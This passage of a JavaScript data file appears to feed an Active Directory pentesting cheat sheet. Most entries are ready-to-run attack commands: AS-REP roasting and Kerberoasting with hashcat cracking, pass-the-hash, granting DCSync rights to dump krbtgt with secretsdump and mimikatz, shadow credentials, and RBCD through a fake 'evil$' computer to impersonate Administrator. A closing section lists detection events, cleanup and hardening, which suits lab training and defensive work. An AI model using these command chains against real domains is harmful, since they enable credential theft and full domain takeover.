                            label: "AS-REP roast path",
                            tag: "ASREP",
                            tagClass: "tag-red",
                            code: "Find users -> request AS-REP -> crack -> validate creds\nkerbrute userenum users.txt -d <DOMAIN> --dc <DC_IP>\nGetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -request -format hashcat -outputfile asrep_hashes.txt\nhashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt",
                            note: "Works when DONT_REQ_PREAUTH is enabled."
                        },
                        {
                            label: "Kerberoast path",
                            tag: "ROAST",
                            tagClass: "tag-red",
                            code: "Find SPNs -> request TGS -> crack -> validate service account\nGetUserSPNs.py '<DOMAIN>/<user>:<pass>' -dc-ip <DC_IP> -request -outputfile tgs_hashes.txt\nhashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt\nnxc smb <DC_IP> -u '<TARGET_USER>' -p 'RecoveredPassword!'",
                            note: "Prioritize adminCount/service accounts with old passwords."
                        },
                        {
                            label: "Pass hash / ticket path",
                            tag: "PTH",
                            tagClass: "tag-purple",
                            code: "Hash -> authenticate directly or request TGT\nnxc smb <DC_IP> -u '<user>' -H ':<NThash>'\npython3 getTGT.py '<DOMAIN>/<user>' -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> -dc-ip <DC_IP>\nexport KRB5CCNAME=$(pwd)/<user>.ccache",
                            note: "Use hash material without changing the account password."
                        }
                    ]
                },
                {
                    title: "Privilege Paths",
                    items: [
                        {
                            label: "WriteDACL -> DCSync",
                            tag: "ACL",
                            tagClass: "tag-red",
                            code: "Find WriteDACL on domain -> grant DCSync -> dump krbtgt\nAdd-DomainObjectAcl -TargetIdentity '<DOMAIN>' -PrincipalIdentity '<user>' -Rights DCSync -Verbose\npython3 secretsdump.py '<DOMAIN>/<user>:<pass>'@<DC_IP> -just-dc-user krbtgt\nmimikatz.exe \"lsadump::dcsync /domain:<DOMAIN> /user:krbtgt\" \"exit\"",
                            note: "One of the highest-impact ACL paths."
                        },
                        {
                            label: "GenericWrite -> shadow creds",
                            tag: "SHADOW",
                            tagClass: "tag-red",
                            code: "Find GenericWrite/GenericAll on user/computer -> add KeyCredential -> request TGT\nbloodyAD ... add shadowCredentials <TARGET_USER>\npython3 gettgtpkinit.py -cert-pfx shadow.pfx '<DOMAIN>/<TARGET_USER>' out.ccache\nexport KRB5CCNAME=$(pwd)/out.ccache",
                            note: "Often cleaner than resetting a password."
                        },
                        {
                            label: "MAQ -> RBCD -> admin ticket",
                            tag: "RBCD",
                            tagClass: "tag-red",
                            code: "Check MAQ -> add computer -> set RBCD -> getST as Administrator\nbloodyAD ... get object \"DC=<DOMAIN_FIRST>,DC=<DOMAIN_TLD>\" --attr ms-DS-MachineAccountQuota\nbloodyAD ... add computer 'evil$' 'P@ss123!'\nbloodyAD ... add rbcd '<TARGET_HOST>$' 'evil$'\npython3 getST.py '<DOMAIN>/evil$:P@ss123!' -spn 'cifs/<TARGET_FQDN>' -impersonate Administrator -dc-ip <DC_IP>",
                            note: "Classic lab chain when computer creation is available."
                        }
                    ]
                }
            ]
        },
        {
            id: "defense-cleanup",
            title: "Detection & Cleanup",
            icon: "ti-shield-check",
            sections: [
                {
                    title: "Detection Focus",
                    items: [
                        {
                            label: "Events to watch",
                            tag: "DETECT",
                            tagClass: "tag-amber",
                            code: "4768: TGT requested\n4769: TGS requested, S4U activity, roasting bursts\n4662: replication rights / DCSync indicators\n4741: computer account added by non-admin\n4742: computer/SPN changes\n5136: directory object or ACL modified\nSysmon 1/10: tool execution and LSASS access",
                            note: "Summarizes detection sections from the AD notes."
                        },
                        {
                            label: "Common cleanup",
                            tag: "CLEAN",
                            tagClass: "tag-green",
                            code: "Remove added group members and ACEs\nClear fake SPNs, scriptPath, DNS records, RBCD, shadow credentials\nDelete test computer accounts if created\nPurge tickets: klist purge\nRotate cracked/reset credentials and krbtgt twice after golden-ticket exposure\nDelete local hash, ticket, BloodHound, and dump artifacts according to scope",
                            note: "Cleanup list for lab hygiene and professional reporting."
                        },
                        {
                            label: "Hardening themes",
                            tag: "HARDEN",
                            tagClass: "tag-blue",
                            code: "Disable unnecessary pre-auth exceptions\nMove services to gMSA where possible\nReduce local admin and LSASS exposure\nMonitor delegation, SPN, DNS, and ACL changes\nAudit MachineAccountQuota and high-value object permissions\nTier admin accounts and protect privileged sessions",
                            note: "Maps exploitation lessons into defensive recommendations."
                        }
                    ]
                }
            ]
        }
    ],
    privexchange: [
        {
            id: "basic",
            title: "Basic",
            icon: "ti-exchange",
            sections: [
                {
                    title: "Introduction",
                    items: [
                        {
                            label: "Placeholder",
                            tag: "future",
                            tagClass: "tag-gray",
                            code: "privexchange.py --help",
                            note: "Future PrivExchange commands will be added here."
                        }
                    ]
                }
            ]
        }
    ]
};
